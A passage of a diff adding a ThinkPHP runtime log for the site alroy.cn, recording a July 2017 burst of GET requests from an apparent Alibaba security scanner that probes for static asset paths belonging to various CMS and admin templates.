+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:51+08:00 ] 60.205.45.195 140.205.201.41 GET /install/images/header-corners.png
+[ log ] alroy.cn/install/images/header-corners.png [运行时间：0.027366s][吞吐率：36.54req/s] [内存消耗：1,838.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'images',
+    2 => 'header-corners.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:51+08:00 ] 60.205.45.195 140.205.201.41 GET /images/gif_47_106.gif
+[ log ] alroy.cn/images/gif_47_106.gif [运行时间：0.026065s][吞吐率：38.37req/s] [内存消耗：1,838.40kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'gif_47_106.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:52+08:00 ] 60.205.45.195 140.205.201.41 GET /static/ayacms.gif
+[ log ] alroy.cn/static/ayacms.gif [运行时间：0.027062s][吞吐率：36.95req/s] [内存消耗：1,838.27kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'ayacms.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:52+08:00 ] 60.205.45.195 140.205.201.41 GET /media/xmlconnect/system/ok.gif
+[ log ] alroy.cn/media/xmlconnect/system/ok.gif [运行时间：0.027955s][吞吐率：35.77req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'media',
+    1 => 'xmlconnect',
+    2 => 'system',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:53+08:00 ] 60.205.45.195 140.205.201.41 GET /skin/frontend/base/default/favicon.ico
+[ log ] alroy.cn/skin/frontend/base/default/favicon.ico [运行时间：0.026294s][吞吐率：38.03req/s] [内存消耗：1,839.10kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'skin',
+    1 => 'frontend',
+    2 => 'base',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'default' => 'favicon.ico',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:53+08:00 ] 60.205.45.195 140.205.201.41 GET /images/qq/qqkf2/Kf_bg03_03.gif
+[ log ] alroy.cn/images/qq/qqkf2/Kf_bg03_03.gif [运行时间：0.025276s][吞吐率：39.56req/s] [内存消耗：1,838.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'qq',
+    2 => 'qqkf2',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:53+08:00 ] 60.205.45.195 140.205.201.41 GET /js/close.gif
+[ log ] alroy.cn/js/close.gif [运行时间：0.027479s][吞吐率：36.39req/s] [内存消耗：1,838.71kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'js',
+    1 => 'close.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:53+08:00 ] 60.205.45.195 140.205.201.41 GET /bbs/css/images/add_category_hover.gif
+[ log ] alroy.cn/bbs/css/images/add_category_hover.gif [运行时间：0.028427s][吞吐率：35.18req/s] [内存消耗：1,838.73kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'bbs',
+    1 => 'css',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:54+08:00 ] 60.205.45.195 140.205.201.41 GET /celive/admin/live/loading.gif
+[ log ] alroy.cn/celive/admin/live/loading.gif [运行时间：0.025591s][吞吐率：39.08req/s] [内存消耗：1,838.65kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'celive',
+    1 => 'admin',
+    2 => 'live',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:54+08:00 ] 60.205.45.195 140.205.201.41 GET /views/admin/images/arrowhead-y.png
+[ log ] alroy.cn/views/admin/images/arrowhead-y.png [运行时间：0.026682s][吞吐率：37.48req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'views',
+    1 => 'admin',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:54+08:00 ] 60.205.45.195 140.205.201.41 GET /extensions/kindeditor/themes/default/default.png)
+[ log ] alroy.cn/extensions/kindeditor/themes/default/default.png) [运行时间：0.028228s][吞吐率：35.43req/s] [内存消耗：1,839.36kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extensions',
+    1 => 'kindeditor',
+    2 => 'themes',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'default' => 'default.png)',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:55+08:00 ] 60.205.45.195 140.205.201.41 GET /style/default/hdwiki.css
+[ log ] alroy.cn/style/default/hdwiki.css [运行时间：0.028134s][吞吐率：35.54req/s] [内存消耗：1,838.50kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'style',
+    1 => 'default',
+    2 => 'hdwiki.css',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:55+08:00 ] 60.205.45.195 140.205.201.41 GET /style/default/fujian_top_bg.jpg
+[ log ] alroy.cn/style/default/fujian_top_bg.jpg [运行时间：0.026449s][吞吐率：37.81req/s] [内存消耗：1,838.80kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'style',
+    1 => 'default',
+    2 => 'fujian_top_bg.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:55+08:00 ] 60.205.45.195 140.205.201.41 GET /style/default/index_login_bg.jpg
+[ log ] alroy.cn/style/default/index_login_bg.jpg [运行时间：0.030686s][吞吐率：32.59req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'style',
+    1 => 'default',
+    2 => 'index_login_bg.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:56+08:00 ] 60.205.45.195 140.205.201.41 GET /style/default/style/bg_title.jpg
+[ log ] alroy.cn/style/default/style/bg_title.jpg [运行时间：0.048775s][吞吐率：20.50req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'style',
+    1 => 'default',
+    2 => 'style',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:56+08:00 ] 60.205.45.195 140.205.201.41 GET /style/default/login_bg.jpg
+[ log ] alroy.cn/style/default/login_bg.jpg [运行时间：0.028644s][吞吐率：34.91req/s] [内存消耗：1,838.50kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'style',
+    1 => 'default',
+    2 => 'login_bg.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:56+08:00 ] 60.205.45.195 140.205.201.41 GET /CN/nite/images/title.gif
+[ log ] alroy.cn/CN/nite/images/title.gif [运行时间：0.030681s][吞吐率：32.59req/s] [内存消耗：1,838.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'CN',
+    1 => 'nite',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:57+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/dialog_closebtn_over.gif
+[ log ] alroy.cn/Images/dialog_closebtn_over.gif [运行时间：0.026452s][吞吐率：37.80req/s] [内存消耗：1,838.38kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'dialog_closebtn_over.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:57+08:00 ] 60.205.45.195 140.205.201.41 GET /App_Themes/AdminDefaultTheme/DateTheme/bgteuw.jpg
+[ log ] alroy.cn/App_Themes/AdminDefaultTheme/DateTheme/bgteuw.jpg [运行时间：0.027041s][吞吐率：36.98req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'App_Themes',
+    1 => 'AdminDefaultTheme',
+    2 => 'DateTheme',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:57+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/Microblog/dialog_rt.gif
+[ log ] alroy.cn/Images/Microblog/dialog_rt.gif [运行时间：0.026371s][吞吐率：37.92req/s] [内存消耗：1,838.49kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'Microblog',
+    2 => 'dialog_rt.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:58+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/li_4.gif
+[ log ] alroy.cn/admin/images/li_4.gif [运行时间：0.027169s][吞吐率：36.81req/s] [内存消耗：1,839.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'li_4.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:58+08:00 ] 60.205.45.195 140.205.201.41 GET /images/default/listico.gif
+[ log ] alroy.cn/images/default/listico.gif [运行时间：0.026355s][吞吐率：37.94req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'default',
+    2 => 'listico.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:58+08:00 ] 60.205.45.195 140.205.201.41 GET /images/default/images/button_plain_hover.png
+[ log ] alroy.cn/images/default/images/button_plain_hover.png [运行时间：0.027545s][吞吐率：36.30req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'default',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:59+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/tpl/images/welcome_h1.gif
+[ log ] alroy.cn/admin/tpl/images/welcome_h1.gif [运行时间：0.026609s][吞吐率：37.58req/s] [内存消耗：1,839.57kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'tpl',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:59+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/bg-pay-return-success.gif
+[ log ] alroy.cn/admin/images/bg-pay-return-success.gif [运行时间：0.029050s][吞吐率：34.42req/s] [内存消耗：1,839.68kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'bg-pay-return-success.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:59+08:00 ] 60.205.45.195 140.205.201.41 GET /template/default/images/ad_scroll_forward.png
+[ log ] alroy.cn/template/default/images/ad_scroll_forward.png [运行时间：0.026459s][吞吐率：37.79req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'default',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:00+08:00 ] 60.205.45.195 140.205.201.41 GET /adfile/ad9.js
+[ log ] alroy.cn/adfile/ad9.js [运行时间：0.026420s][吞吐率：37.85req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'adfile',
+    1 => 'ad9.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:00+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/login_06.jpg
+[ log ] alroy.cn/admin/images/login_06.jpg [运行时间：0.027723s][吞吐率：36.07req/s] [内存消耗：1,839.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'login_06.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:00+08:00 ] 60.205.45.195 140.205.201.41 GET /extmail/default/images/lastpg.d.gif
+[ log ] alroy.cn/extmail/default/images/lastpg.d.gif [运行时间：0.026808s][吞吐率：37.30req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extmail',
+    1 => 'default',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
